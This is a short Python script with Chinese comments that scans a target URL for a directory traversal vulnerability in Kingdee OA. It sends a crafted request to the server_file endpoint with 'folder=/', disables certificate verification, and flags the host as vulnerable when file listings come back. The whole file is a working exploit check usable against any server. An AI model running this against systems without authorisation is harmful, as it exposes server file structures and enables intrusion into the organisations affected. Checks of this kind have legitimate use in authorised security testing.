#!/usr/bin/env python
# coding=utf-8
#金蝶OAserver_file目录遍历漏洞
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''
def pscan_vuln(url):
    urls = url
    global results
    try:
        response = requests.get(url=url + '/appmonitor/protected/selector/server_file/files?folder=/&suffix=', verify=False,timeout=20)
        bm=response.encoding #获取网页编码
        response.encoding = str(bm) #设置网页编码
        if 'application_log.html' in response.text or '"folder":true' in response.text:
            print(colored('[+]存在金蝶OAserver_file目录遍历漏洞', 'red'))
            results = f'{urls}-->存在金蝶OAserver_file目录遍历漏洞'
        else:
            print('[-]不存在金蝶OAserver_file目录遍历漏洞')
    except:
        print('[-]不存在金蝶OAserver_file目录遍历漏洞')


def jingdieOAserver_file(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results

